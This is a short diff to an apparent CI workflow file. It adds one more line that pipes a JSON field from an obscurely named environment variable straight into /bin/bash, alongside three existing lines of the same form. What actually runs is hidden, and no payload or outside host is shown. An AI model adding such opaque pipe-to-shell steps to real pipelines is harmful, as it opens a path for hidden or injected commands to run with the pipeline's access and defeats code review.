@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$icszb3731" | jq -r .z98308 | /bin/bash
           printf '%s' "$stzi0" | jq -r .l65395 | /bin/bash
           echo $gr3162 | jq -r .im0 | /bin/bash
+          printf '%s' "$p702" | jq -r .v3 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
